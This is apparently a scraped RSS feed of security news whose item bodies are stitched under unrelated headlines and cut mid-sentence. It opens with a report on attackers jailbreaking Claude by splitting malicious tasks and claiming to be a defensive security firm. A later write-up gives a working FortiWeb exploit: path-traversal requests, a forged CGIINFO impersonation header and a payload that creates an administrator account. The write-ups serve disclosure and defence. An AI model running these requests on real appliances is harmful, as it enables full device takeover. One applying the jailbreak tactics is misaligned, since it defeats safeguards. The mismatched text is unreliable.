cyber operations.At this point they had to convince Claude—which is extensively trained to avoid harmful behaviors—to engage in the attack. They did so by jailbreaking it, effectively tricking it to bypass its guardrails. They broke down their attacks into small, seemingly innocent tasks that Claude would execute without being provided the full context of their malicious purpose. They also told Claude that it was an employee of a legitimate cybersecurity firm, and was being used in defensive testing.The attackers then initiated the second phase of the attack, which involved Claude Code inspecting the target organization’s systems and infrastructure and spotting the highest-value databases. Claude was able to perform this reconnaissance in a fraction of the time it would’ve taken a team of human hackers. It then reported back to the human operators with a summary of its findings.In the next phases of the attack, Claude identified and tested security vulnerabilities in the target organizations’ systems by researching and writing its own exploit code. Having done so, the framework was able to use Claude to harvest credentials (usernames and passwords) that allowed it further access and then extract a large amount of private data, which it categorized according to its intelligence value. The highest-privilege accounts were identified, backdoors were created, and data were exfiltrated with minimal human supervision.In a final phase, the attackers had Claude produce comprehensive documentation of the attack, creating helpful files of the stolen credentials and the systems analyzed, which would assist the framework in planning the next stage of the threat actor’s cyber operations.Overall, the threat actor was able to use AI to perform 80-90% of the campaign, with human intervention required only sporadically (perhaps 4-6 critical decision points per hacking campaign). The sheer amount of work performed by the AI would have taken vast amounts of time for a human team. At the peak of its attack, the AI made thousands of requests, often multiple per second—an attack speed that would have been, for human hackers, simply impossible to match.Claude didn’t always work perfectly. It occasionally hallucinated credentials or claimed to have extracted secret information that was in fact publicly-available. This remains an obstacle to fully autonomous cyberattacks.Cybersecurity implicationsThe barriers to performing sophisticated cyberattacks have dropped substantially—and we predict that they’ll continue to do so. With the correct setup, threat actors can now use agentic AI systems for extended periods to do the work of entire teams of experienced hackers: analyzing target systems, producing exploit code, and scanning vast datasets of stolen information more efficiently than any human operator. Less experienced and resourced groups can now potentially perform large-scale attacks of this nature.This attack is an escalation even on the “vibe hacking” findings we reported this summer: in those operations, humans were very much still in the loop, directing the operations. Here, human involvement was much less frequent, despite the larger scale of the attack. And although we only have visibility into Claude usage, this case study probably reflects consistent patterns of behavior across frontier AI models and demonstrates how threat actors are adapting their operations to exploit today’s most advanced AI capabilities.This raises an important question: if AI models can be misused for cyberattacks at this scale, why continue to develop and release them? The answer is that the very abilities that allow Claude to be used in these attacks also make it crucial for cyber defense. When sophisticated cyberattacks inevitably occur, our goal is for Claude—into which we’ve built strong safeguards—to assist cybersecurity professionals to detect, disrupt, and prepare for future versions of the attack. Indeed, our Threat Intelligence team used Claude extensively in analyzing the enormous amounts of data generated during this very investigation.A fundamental change has occurred in cybersecurity. We advise security teams to experiment with applying AI for defense in areas like Security Operations Center automation, threat detection, vulnerability assessment, and incident response. We also advise developers to continue to invest in safeguards across their AI platforms, to prevent adversarial misuse. The techniques described above will doubtless be used by many more attackers—which makes industry threat sharing, improved detection methods, and stronger safety controls all the more critical.Added an additional hyperlink to the full report in the initial sectionCorrected an error about the speed of the attack: not "thousands of requests per second" but "thousands of requests, often multiple per second"]]></content:encoded></item><item><title>&amp;#x26;#xa;Finger.exe &amp;#x26; ClickFix, (Sun, Nov 16th)</title><link>https://isc.sans.edu/diary/rss/32492</link><author></author><category>threatintel</category><pubDate>Sun, 16 Nov 2025 07:27:55 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[The finger.exe command is used in ClickFix attacks.]]></content:encoded></item><item><title>SANS Holiday Hack Challenge 2025, (Sun, Nov 16th)</title><link>https://isc.sans.edu/diary/rss/32488</link><author></author><category>threatintel</category><pubDate>Sun, 16 Nov 2025 07:15:45 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[The SANS Holiday Hack Challenge™ 2025 is available.]]></content:encoded></item><item><title>Microsoft: Windows 10 KB5068781 ESU update may fail with 0x800f0922 errors</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-windows-10-kb5068781-esu-update-may-fail-with-0x800f0922-errors/</link><author>Lawrence Abrams</author><category>security</category><pubDate>Sat, 15 Nov 2025 20:42:45 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft has confirmed it is investigating a bug causing the Windows 10 KB5068781 extended security update to fail to install with 0x800f0922 errors on devices with corporate licensing.

As the article explains, “The deadline is quickly approaching for eligible AT&T customers to submit a claim to receive as much as $7,500 in the company’s $177 million class action settlement.”The settlement follows allegations that AT&T “failed to protect customers’ personal data from being released onto the dark web,” after two data breaches occurred in 2024.Details of the Two Data BreachesThe first breach occurred on March 30, 2024, involving “names, addresses, telephone numbers, email addresses, dates of birth, account passcodes, billing account numbers, and Social Security numbers.”The second breach, reported on July 12, 2024, involved “the illegal downloading of customers’ call and text data.”AT&T denies wrongdoing, with the Kroll Settlement Administration stating that “AT&T denies the claims alleged in the Lawsuit and denies any wrongdoing.”Extended Deadline for FilingThe filing deadline was originally set for Nov. 18 but has been extended. As the article states, “The deadline for eligible customers to submit a claim was originally on Tuesday, Nov. 18, but has been extended to Thursday, Dec. 18.”All claims “must be submitted online or mailed and postmarked by then.”Who Is Eligible to File a Claim?The settlement covers two distinct classes:“The first settlement class includes all of the AT&T customers involved in the March 30, 2024, data breach.”“The second settlement class includes all of the AT&T customers involved in the data breach incident announced on July 12, 2024.”Some customers may fall under both classes.AT&T previously stated that the breaches “are believed to have impacted approximately 7.6 million people who held AT&T accounts in 2024 and about 65.4 million people who held accounts between 2019 and 2024.”Eligible customers can submit claims at telecomdatasettlement.com or mail them to:AT&T Data Incident Settlementc/o Kroll Settlement Administration LLCNew York, NY 10150-5324The hotline, , allows customers to check eligibility.How Much Money Can Customers Receive?For the first settlement class, customers may file for:Documented loss cash payment up to $5,000, orTier 1 or Tier 2 cash paymentsAccording to the article, “The Tier 1 cash payment is given to customers whose social security numbers were included in the March 30, 2024, data breach.”Tier 2 applies to customers whose data was leaked  SSNs. “Tier 1 cash payments are five times the amount of Tier 2 payments.”For the second settlement class, customers can receive:“Up to $2,500 by submitting a documented loss cash payment claim.”A  option, which provides “a cash payment share of the settlement after administration costs and fees are paid.”Customers impacted by both breaches “can receive up to $7,500.”]]></content:encoded></item><item><title>Face Scrapper Ai like faceSeek -netsec analysis</title><link>https://faceseek.online/</link><author>/u/Few_Extension6813</author><category>netsec</category><pubDate>Sat, 15 Nov 2025 13:17:44 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Welcome to FaceSeek, the premieronline face search enginedesigned to help you,, and enhance.

The initial message was followed up by an email:“Thank you for your interest in the Senior Construction Manager position at {company}. After reviewing your background, we were impressed with your experience and would like to invite you to the next stage of our selection process — a virtual interview.In this session, we’ll discuss your project management experience, leadership approach, and how your expertise aligns with {company}’s current and upcoming construction initiatives.A Zoom link will be shared in a follow-up email, which will allow you to select a time that’s most convenient for you.If you have any questions in the meantime, please don’t hesitate to reach out. I look forward to speaking with you soon.I edited out the company name and the name of the supposed recruiter, but when we Googled that alleged recruiter’s name, he does work at the impersonated company (just not in HR). That’s not unique, though. We’ve heard several variants of very similar stories involving other companies and other names.Other red flags included the fact that the email came from a Gmail address (not a company domain), and that the company has no openings for a Senior Construction Manager.When our target replied they were looking forward to the interview, they received the “Meeting invitation” by email:      {recruiter} INVITED YOU TO A ZOOM REMOTE MEETINGPlease click the button below to view the invitation within 30 days. By acceptance, you’ll be able to message and call each other.To see the list of invited guests, click here.Both links in this email were shortened t[.]co links that redirected to meetingzs[.]com/bt.That site is currently unavailable, but users have reported seeing fake Windows update warnings, or notifications about having to install updates for their meeting application (Zoom, Teams—name your favorite). Our logs show that we blocked meetingzs[.]com for phishing and hosting a file called GoToResolveUnattendedUpdater.exe.While this file is not malicious in itself, it can be abused by cybercriminals. It’s associated with LogMeIn Resolve, a remote support tool, which attackers can fake or misuse to execute ransomware payloads once installed.This tactic is part of a broader trend where attackers pose as recruiters or trusted contacts, inviting targets to meetings and requiring them to install software updates to participate. Those updates, however, can be malware installers or Remote Monitoring and Management (RMM) tools which can give attackers direct access to your device.This type of attack is a prime example of how social engineering is becoming the primary way to gain initial access to you or your company’s system.The best way to stay safe is to be able to recognize attacks like these, but there are some other things you can do.Always keep your operating system, software, and security tools updated regularly with the latest patches to close vulnerabilities.Be extremely cautious with unsolicited communications, especially those inviting you to meetings or requesting software installs or updates; verify the sender and context independently.Avoid clicking on links or downloading attachments from unknown or unexpected sources. Verify their authenticity first.Compare the URL in the browsers’ address bar to what you’re expecting.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Checkout.com snubs hackers after data breach, to donate ransom instead</title><link>https://www.bleepingcomputer.com/news/security/checkoutcom-snubs-shinyhunters-hackers-to-donate-ransom-instead/</link><author>Bill Toulas</author><category>security</category><pubDate>Fri, 14 Nov 2025 16:25:42 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[UK financial technology company Checkout announced that the ShinyHunters threat group has breached one of its legacy cloud storage systems and is now extorting the company for a ransom.

For many, this will feel like a normal Tuesday.For others, it will feel like a Monday.Moments like this are why we exist- as always, the watchTowr team moved quickly, spinning up our rapid reaction process to support clients as the threat emerged.Fortinet system administrators staring inquisitively at packet captures (as you generally have to do as an administrator of any security appliance), may have seen the following request stream pass them in the past weeks:POST /api/v2.0/cmdb/system/admin%3F/../.. ../../../cgi-bin/fwbcgi HTTP/1.1

While many may have dismissed it as Internet junk, it wasn’t - it was evidence of a threat actor looking to exploit a vulnerability (currently unnamed and without ID) that allowed privileged administrative functions to be reached.In the example above, the threat actor exploited the vulnerability to add administrative accounts to the target and vulnerable appliance, serving as a weak persistence mechanism. To be explicitly clear, this is a complete compromise of the vulnerable appliance.The vulnerability itself? As far as we can see, it’s actually two..A Path Traversal vulnerability that we can see within the URIAn Authentication Bypass vulnerability (via the contents of the HTTP request header  )This question has been screamed at us for the last 24 hours.While patch notes for FortiWeb 8.0.2 don’t include a reference or mention of any resolved vulnerabilities, the results from our internal testing labs show that 8.0.2 is mysteriously patched for this mysterious vulnerability:Did Fortinet stumble, silently, into patching a vulnerability? Only Fortinet knows, really.The following versions are known to be affected (thanks to Orange Cyberdefense for sharing information with us):The First Step - The Path TraversalThe first stage of our vulnerability begins with leveraging a path traversal.GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1
Host: 192.168.9.1
Connection: keep-alive

As you can see, this is fairly ‘simple’ - if the URI begins with a valid FortiWeb API path, an attacker is then able to traverse to another CGI executable.Which CGI executable? Well, there is only one -  - so the choice is fairly simple.The following method can be used to quickly check whether your FortiWeb version is affected by this vulnerability.If the request returns HTTP 200, the vulnerability is present.If the request returns HTTP 403, the vulnerability has been patched.Let’s very briefly explain how the  binary works. For context, the main function provided by  follows this structure:int __fastcall main(int argc, const char **argv, const char **envp)
{
  [..SNIP..]

  cgi_init(v3);
  while ( !access("/var/log/debug_cgi", 0) )
    sleep(1u);
  if ( (unsigned int)cgi_inputcheck((__int64)v4) || (gui_conf_init(), cli_init(), (unsigned int)cgi_auth(v4)) )
  {
    cgi_output(v4);
  }
  else
  {
    cgi_process(v4);
    cgi_output(v4);
    conf_end();
  }
  cgi_free(v4);
  return 0;
}
Our goal is to reach the  function, which contains all the backend functionality we need access to. However, two validation functions stand between us and this objective:Both checks must pass (return 0) for execution to proceed to .Step Two (a) - cgi_inputcheck()In reality,  is very simple.The  routine is designed to perform a very lightweight validation of the incoming HTTP body. In practice, its role is limited to confirming that the content is a valid JSON blob.The relevant portion of the function looks like this:__int64 __fastcall cgi_inputcheck(__int64 a1)
{
  [..SNIP..]
  
  v1 = (char *)cat_cgi_paths();
  snprintf(s, 0x100uLL, "%s%s%s", "/var/log/inputcheck/", v1, ".json");
  free(v1);
  v2 = fopen(s, "r");
  if ( !v2 )
    return 0LL;  // File doesn't exist - check passes
    
  [..SNIP..]
  
  v10 = json_tokener_parse((__int64)v8);
  if ( !v10 )
  {
    // JSON parsing failed - check fails
    return 0LL;
  }

To assume administrative privileges, we can follow the following flow:Create a JSON object with built-in  credentials:{
  "username": "admin",
  "profname": "super_admin",
  "vdom": "root",
  "loginname": "admin"
}
Send it in the  headerOnce processed by , the vulnerable appliance will happily impersonate the supplied user and treat the request as authenticated with full administrative rights.From this point on, all execution flows into , which is the heart of the backend logic. That means an attacker can perform any privileged action simply by supplying the appropriate JSON structure.For example, the following payload instructs the appliance to create a new local user named  with the password  and administrative privileges ():{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","last-name":"","first-name":"","email-address":"","phone-number":"","mobile-number":"","hidden":0,"comments":"","sz_dashboard":-1,"type":"local-user","type_val":"0","admin-usergrp_val":"0","wildcard_val":"0","accprofile-override_val":"0","sshkey":"","passwd-set-time":0,"history-password-pos":0,"history-password0":"","history-password1":"","history-password2":"","history-password3":"","history-password4":"","history-password5":"","history-password6":"","history-password7":"","history-password8":"","history-password9":"","force-password-change":"disable","force-password-change_val":"0","password":"watchTowr"}}

Auth. Bypass)

The Internet is ablaze, and once again we all have a front-row seat - a bad person, if you can believe it, is doing a bad thing!

The first warning of such behaviour came from the great team at Defused:

As many are now aware, an unnamed (and potentially silently fixed) vulnerability affecting a number of Forti-devices (blast radius is currently unclear) is being actively exploited. For many, this will feel like a normal Tuesday.

For others, it will feel like a Monday.

Moments like this are why we exist. As soon as we identified the activity, the watchTowr team moved quickly, spinning up our rapid reaction process to support clients as the threat emerged.

### The Vulnerability

Fortinet system administrators staring inquisitively at packet captures (as you generally have to do as an administrator of any security appliance), may have seen the following request stream pass them in the past weeks:

```
POST /api/v2.0/cmd/system/admin%3F/../.. ../../../cgi-bin/fwbcgi HTTP/1.1 Host: [redacted] User-Agent: python-urllib3/2.2.3 Accept-Encoding: identity CGIINFO: eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb201OiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ== Content-Length: 835 Content-Type: application/json { "data": { "q_type": 1, "name": "Testpoint", "access-profile": "prof_admin", "access-profile_val": "0", "trusthostv4": "0.0.0.0/0 ", "trusthostv6": "::/0 ", "last-name": "", "first-name": "", "email-address": "", "phone-number": "", "mobile-number": "", "hidden": 0, "domains": "root", "sz_dashboard": -1, "type": "local-user", "type_val": "0", "admin-usergrp_val": "0", "wildcard_val": "0", "accprofile-override_val": "0", "sshkey": "", "passwd-set-time": 0, "history-password-pos": 0, "history-password0": "", "history-password1": "", "history-password2": "", "history-password3": "", "history-password4": "", "history-password5": "", "history-password6": "", "history-password7": "", "history-password8": "", "history-password9": "", "force-password-change": "disable", "force-password-change_val": "0", "password": "AFodIUU3Sszp5" }}
```

While many may have dismissed it as Internet junk, it wasn’t - it was evidence of a threat actor looking to exploit a vulnerability (currently unnamed and without ID) that allowed privileged administrative functions to be reached.

In the example above, the threat actor exploited the vulnerability to add administrative accounts to the target and vulnerable appliance, serving as a weak persistence mechanism.

To be explicitly clear, this is a complete compromise of the vulnerable appliance.

The vulnerability itself? As far as we can see, it’s actually two..

- A Path Traversal vulnerability that we can see within the URI
- An Authentication Bypass vulnerability (via the contents of the HTTP request header `CGIINFO`)

### Is Fortinet Aware?

This question has been screamed at us for the last 24 hours.

While patch notes for FortiWeb 8.0.2 don’t include a reference or mention of any resolved vulnerabilities, the results from our internal testing labs show that 8.0.2 is mysteriously patched for this mysterious vulnerability:

Did Fortinet stumble, silently, into patching a vulnerability? Only Fortinet knows, really.

The following versions are known to be affected (thanks to Orange Cyberdefence for sharing some of these versions with us):

- 8.0: <8.0.2
- 7.6: <7.6.5
- 7.4: <7.4.10
- 7.2: <7.2.12
- 7.0: <7.0.12
- 6.4: <= 6.4.3
- 6.3: <= 6.3.23

### The First Step - The Path Traversal

The first stage of our vulnerability begins with leveraging a path traversal.

```
GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1 Host: 192.168.9.1 Connection: keep-alive
```

As you can see, this is fairly ‘simple’ - if the URI begins with a valid FortiWeb API path, an attacker is then able to traverse to another CGI executable. followed by a path-traversal sequence attempting to reach another CGI executable.

Which CGI executable? Well, there is only one - `fwbcgi` \- so the choice is fairly simple.

The following method can be used to quickly check whether your FortiWeb version is affected by this vulnerability.

- If the request returns HTTP 200, the vulnerability is present.
- If the request returns HTTP 403, the vulnerability has been patched.

### Step Two - FWBCGI

Let’s very briefly explain how the `fwbcgi` binary works. For context, the main function provided by `fwbcgi` follows this structure:

```
int __fastcall main(int argc, const char **argv, const char **envp) { [..SNIP..] cgi_init(v3); while ( !access("/var/log/debug_cgi", 0) ) sleep(1u); if ( (unsigned int)cgi_inputcheck((__int64)v4) || (gui_conf_init(), cli_init(), (unsigned int)cgi_auth(v4)) ) { cgi_output(v4); } else { cgi_process(v4); cgi_output(v4); conf_end(); } cgi_free(v4); return 0; }
```

Our goal is to reach the `cgi_process()` function, which contains all the backend functionality we need access to. However, two validation functions stand between us and this objective:

1. `cgi_inputcheck()`
2. `cgi_auth()`

Both checks must pass (return 0) for execution to proceed to `cgi_process()`.

### Step Two (a) - cgi\_inputcheck()

In reality, `cgi_inputcheck()` is very simple.

The `cgi_inputcheck()` routine is designed to perform a very lightweight validation of the incoming HTTP body. In practice, its role is limited to confirming that the content is a valid JSON blob.

The relevant portion of the function looks like this:

```
__int64 __fastcall cgi_inputcheck(__int64 a1) { [..SNIP..] v1 = (char *)cat_cgi_paths(); snprintf(s, 0x100uLL, "%s%s%s", "/var/log/inputcheck/", v1, ".json"); free(v1); v2 = fopen(s, "r"); if ( !v2 ) return 0LL; // File doesn't exist - check passes [..SNIP..] v10 = json_tokener_parse((__int64)v8); if ( !v10 ) { // JSON parsing failed - check fails return 0LL; } [..SNIP..] }
```

The logic here is remarkably permissive:

- If the associated `inputcheck` file does **not** exist (the default case), the function immediately returns `0`\- validation passed.
- If the file **does** exist, the only requirement is that the body can be parsed as valid JSON.

As a result, any valid JSON object satisfies this check, including the simplest possible JSON payload:

```
{}
```

Let’s move on…

### Step Two (b) - Impersonating Users Via `cgi_auth()`

This is where things become significantly more interesting.

While you might expect `cgi_auth()` to authenticate the caller, that is _not_ what it does. Instead, the function effectively provides a mechanism to **impersonate any user** based on data supplied by the client. The behaviour unfolds in several steps:

1. At **\[1\]**, the function extracts a `CGIINFO` header from the HTTP request.
2. At **\[2\]**, the value is Base64-decoded.
3. At **\[3\]**, the result is parsed as JSON.
4. At **\[4\]**, the function iterates through all JSON keys and extracts several user-related attributes:
   - `username` \> target username
   - `profname` \> profile name
   - `vdom` \> virtual domain
   - `loginname` \> login identifier

These fields are used to tell `fwbcgi` which user the HTTP request sender wishes to impersonate.

Notably, the built-in `admin` account on FortiWeb appliances has a consistent set of attributes across devices - and these attributes cannot be modified.

The relevant portion of the function looks like this:

```
__int64 __fastcall cgi_auth(_QWORD *a1) { [..SNIP..] v2 = getenv("HTTP_CGIINFO"); if ( !v2 ) { message("%s:%d: not include cgi info header\\n", s); return 0xFFFFFFFFLL; } // Decode base64 HTTP_CGIINFO header cmDecodeB64(v19, 512LL, v2, 0xFFFFFFFFLL); // [2] v3 = json_tokener_parse(v19); // [3] [..SNIP..] // Extract user attributes from the decoded JSON // [4] for ( i = *(_QWORD *)(json_object_get_object(v3) + 8); i; i = *(_QWORD *)(i + 24) ) { v5 = *(const char **)i; string = (const char *)json_object_get_string(*(_QWORD *)(i + 16)); if ( !strncmp(v5, "username", 8uLL) ) a1[682] = strdup(string); else if ( !strncmp(v5, "profname", 8uLL) ) a1[683] = strdup(string); else if ( !strncmp(v5, "vdom", 4uLL) ) a1[684] = strdup(string); else if ( !strncmp(v5, "loginname", 9uLL) ) a1[685] = strdup(string); // ... additional fields } // Set login context with extracted credentials // [5] set_login_context_vsa(a1[685], a1[682], v19, a1[683], v8, 0LL); domain_id = cmf_shm_find_domain_id((void *)a1[684]); cmf_set_cur_domain_id(domain_id); return 0LL; }
```

Once all fields are extracted, the call at **\[5\]** \- `set_login_context_vsa()` \- applies the impersonation context.

From this point onward, all actions executed within `cgi_process()` are performed as the impersonated user.

In other words - by supplying a handcrafted `HTTP_CGIINFO` header, an attacker can impersonate any user, including the built-in admin, and inherit their full privileges.

Beautiful.

### Exploiting the Vulnerability

With both validation checks out of the way, exploitation becomes remarkably straightforward. To assume administrative privileges, we can follow the following flow:

1. Create a JSON object with built-in `admin` credentials:

```
{ "username": "admin", "profname": "super_admin", "vdom": "root", "loginname": "admin" }
```

1. Base64-encode this JSON
2. Send it in the `HTTP_CGIINFO` header

Once processed by `cgi_auth()`, the vulnerable appliance will happily impersonate the supplied user and treat the request as authenticated with full administrative rights.

From this point on, all execution flows into `cgi_process()`, which is the heart of the backend logic. That means an attacker can perform any privileged action simply by supplying the appropriate JSON structure.

For example, the following payload instructs the appliance to create a new local user named `watchTowr` with the password `watchTowr` and administrative privileges ( `prof_admin`):

```
{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","last-name":"","first-name":"","email-address":"","phone-number":"","mobile-number":"","hidden":0,"comments":"","sz_dashboard":-1,"type":"local-user","type_val":"0","admin-usergrp_val":"0","wildcard_val":"0","accprofile-override_val":"0","sshkey":"","passwd-set-time":0,"history-password-pos":0,"history-password0":"","history-password1":"","history-password2":"","history-password3":"","history-password4":"","history-password5":"","history-password6":"","history-password7":"","history-password8":"","history-password9":"","force-password-change":"disable","force-password-change_val":"0","password":"watchTowr"}}
```

FBI investigators traced Volkov through iCloud, cryptocurrency records, and social media, recovering chat logs, stolen credentials, and evidence of ransom negotiations, which all linked him to $1.5 million in collected payments.His breaches affected companies across multiple states, including banks, engineering firms, and telecoms. Volkov faces up to 53 years in prison and over $9.1 million in restitution for charges including trafficking in access, identity theft, computer fraud, and money laundering., an international effort against cybercrime. Coordinated by Europol and Eurojust with support from private partners, the action consisted of searches at 11 locations in Germany, Greece, and the Netherlands, where officers seized 20 domains and arrested a key VenomRAT suspect. The disrupted infrastructure involved hundreds of thousands of infected devices and millions of stolen credentials, including access to over 100,000 crypto wallets. Rhadamanthys, active since 2023, had seen rapid growth in late 2025, affecting thousands of IP addresses daily.Authorities recommend checking systems for infection via politie.nl/checkyourhack and haveibeenpwned.com.

The vulnerability, tracked as CVE-2025-12480, allows attackers to abuse an access control logic error that grants admin privileges when the request host equals ‘localhost’. By spoofing this value in the HTTP host header, an attacker can reach sensitive setup pages without credentials, especially on systems where the  parameter was never configured.Security researchers first discovered an intrusion in August targeting a Triofox instance running version 16.4.10317.56372. They later determined that the threat cluster UNC6485 used a malicious HTTP GET request containing a localhost header to access the  setup page. Using this workflow, the attackers created a rogue administrator account called ‘Cluster Admin’, uploaded a malicious script, and configured Triofox to treat that script as the antivirus scanner path. .The payload then launches a PowerShell downloader to retrieve a Zoho UEMS installer, which subsequently deploys Zoho Assist and AnyDesk on the compromised host for remote access and lateral movement. The attackers were also observed using Plink and PuTTY to establish SSH tunnels and forward traffic to the compromised host’s RDP port.Gladinet has since fixed CVE-2025-12480 in Triofox version 16.7.10368.56560, and administrators are urged to update to the latest release (16.10.10408.56683), review admin accounts, and ensure the antivirus engine is not configured to run unauthorized binaries.The Ugly | Attackers Exploit Zero-Day to Steal Washington Post Employee DataThe Washington Post, one of the vendors impacted by a breach targeting Oracle software,  in the data theft campaign. The Post, one of the largest U.S. newspapers with 2.5 million digital subscribers, confirmed that attackers accessed parts of its network between July 10 and August 22 by exploiting a previously unknown zero-day vulnerability in Oracle E-Business Suite, the organization’s internal enterprise resource planning (ERP) system. The vulnerability is tracked as CVE-2025-61884.According to the letter sent to affected individuals, the Post learned of the intrusion after a threat actor contacted the company on September 29 claiming access to its Oracle applications. Post-breach investigations identified the widespread flaw that allowed the attackers to access many Oracle customers’ applications. The attackers used this flaw to steal sensitive data and later attempted to extort the Post and other organizations breached in the same campaign.Although the Post did not name the group responsible, The Post’s investigation has determined that data belonging to 9,720 individuals was compromised.

For now, it works only for identity verification at Transportation Security Administration (TSA) checkpoints in more than 250 airports.Apple says the reason for the introduction is because users asked for it:“Since introducing the ability to add a driver’s license or state ID to Apple Wallet in 2022, we’ve seen how much users love having their ID right on their devices. Digital IDs brings this secure and convenient option to even more users across the country, as they can now add an ID to Wallet using information from their U.S. passport.”What does Apple’s Digital ID mean for users?You add a Digital ID by scanning your physical passport (photo page and chip) and taking a selfie as part of a verification process. Your ID stays encrypted on the device and isn’t shared with Apple.To present it, you hold your iPhone or Apple Watch near a reader and confirm with Face ID or Touch ID. You choose which information is shared, and you never have to unlock or hand over your device.At launch, it’s TSA-only. Apple says wider use at businesses, organizations, and online services will come later. Digital ID  replace a passport for international travel.Pros of Apple’s Digital ID:Quickly present your ID from your iPhone or Apple Watch for TSA security, and eventually, for businesses or online checks.The ID data is locally encrypted and requires biometric authentication for access. Users review and authorize the information shared, and Apple claims it doesn’t track when you use the ID.It’s helpful for people without a REAL ID-compliant driver’s license who want to fly domestically.You don’t hand over your device for inspection. You just present your phone or watch to a reader.Apple already has the support of states and airports, and plans to expand.The risks of using Apple’s Digital IDWe had to look at other sources to find some of the more serious downsides.Lose your phone or watch, and you lose access to your Digital ID. That’s not to mention the risks if the device is stolen.Privacy and surveillance: Experts warn Digital ID adoption may lead to more ID checks in places that didn’t require them before, increasing surveillance and data tracking concerns.​Potential for security breaches: Encrypted or not, digital IDs can still be targeted by device exploits, phishing, or social engineering.Face ID or Touch ID can, in some cases, be spoofed or exploited.​Apple’s system is closed, which means users are dependent on Apple’s legacy, update policies, and device ecosystem. If you switch platforms, you might find it hard to recover your digital ID. Critics worry police or other authorities could pressure users to unlock devices under the guise of ID verification.Data sharing with state authorities: Your photo, video, and limited device analytics may be shared temporarily with issuing authorities for verification.​Digital ID doesn’t replace your passport outside the US, so it’s not very useful for international travel, and it’s not accepted everywhere yet.Apple’s Digital ID aims to make ID checks private, more secure, and convenient for most users. But concerns remain regarding privacy, device loss, ecosystem lock-in, and the potential for expanded surveillance and demands in everyday activities beyond TSA checkpoints.We still see this option as safer than storing your ID in a browser, where attacks are far more common, but the drawbacks may still outweigh the benefits for many users. As one of our readers put it: “The inconvenience of having to look through a drawer for my passport is not that big, that I would risk having my identity stolen.”We don’t just report on threats—we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

The line seems to be between fact-based decisions and judgment-based decisions.For example, in a medical context, if an AI was demonstrably better at reading a test result and diagnosing cancer than a human, you would take the AI in a second. You want the more accurate tool. But justice is harder because justice is inherently a human quality in a way that “Is this tumor cancerous?” is not. That’s a fact-based question. “What’s the right thing to do here?” is a human-based question.Chess provides a useful analogy for this evolution. For most of history, humans were best. Then, in the 1990s, Deep Blue beat the best human. For a while after that, a good human paired with a good computer could beat either one alone. But a few years ago, that changed again, and now the best computer simply wins. There will be an intermediate period for many applications where the human-AI combination is optimal, but eventually, for fact-based tasks, the best AI will likely surpass both.The enduring role for humans lies in making judgments, especially when values come into conflict. What is the proper immigration policy? There is no single “right” answer; it’s a matter of feelings, values, and what we as a society hold dear. A lot of societal governance is about resolving conflicts between people’s rights—my right to play my music versus your right to have quiet. There’s no factual answer there. We can imagine machines will help; perhaps once we humans figure out the rules, the machines can do the implementing and kick the hard cases back to us. But the fundamental value judgments will likely remain our domain.This essay originally appeared in IVY.]]></content:encoded></item><item><title>Google backpedals on new Android developer registration rules</title><link>https://www.bleepingcomputer.com/news/google/google-backpedals-on-new-android-developer-registration-rules/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 14 Nov 2025 11:54:44 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Google is backpedaling on its decision to introduce new identity verification rules for all developers, stating that it will also introduce accounts for limited app distribution and will allow users to install apps from unverified devs. [...]]]></content:encoded></item><item><title>Ransomware&apos;s Fragmentation Reaches a Breaking Point While LockBit Returns</title><link>https://thehackernews.com/2025/11/ransomwares-fragmentation-reaches.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3uOnzefv5B2kTQp_6TWvGzdYVbKeSKfysA_sFwHY_ZwrX14JYItv8p8x1NQwG5wOyRqJT0oaAWfGM0VWHZrsRa0ULtSxxfEAFoMkbd4hFmx7X7K_nWXbF6XaK4PRp2I0Daue7934YaCR1II5aR0H1Ah7kWkW2Izqy4m30VUvtA30a9N1yVuKcSRuGOlk/s1600/main-cover.jpg" length="" type=""/><pubDate>Fri, 14 Nov 2025 10:37:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Key Takeaways:

## The Target

A few months ago I realized I was overdue for a fun, quirky hardware project. Every so often I like to see what new and interesting electronic children's toys are out there. When looking, I keep in mind the potential attack surface, typically preferring toys with companion mobile apps, wireless communications, or any other added complexity.

I came across these robots that draw from a set of pre-defined images. They all come with a pack of 100 or 150 cards, and the drawings appear very similar across brands. The attack surface seemed especially small, given that it uses pre-defined physical cards, so I wouldn't be able to snoop an FCC ID for this one and peek its sweet sweet innards (I consider those spoilers anyway). Regardless, it seemed like an interesting target and I couldn't resist.

I picked this one because it had the best face. The wording/typos on the box were definitely a good sign that there was some quirkiness afoot. It came with a stack of 100 cards, each with a very minimal "barcode" consisting of 8 bits of information, meaning 256 possible barcodes/drawings. The cards were separated into five categories: food, animal, plant, vehicle, and circle (obviously). I loaded up the “bulbous cactus” card and sent it on its way. It talked. It sang. It’s perfect.

Let us commence the evisceration.

## Tearing it Down

If I'm being honest, this is my favorite part.

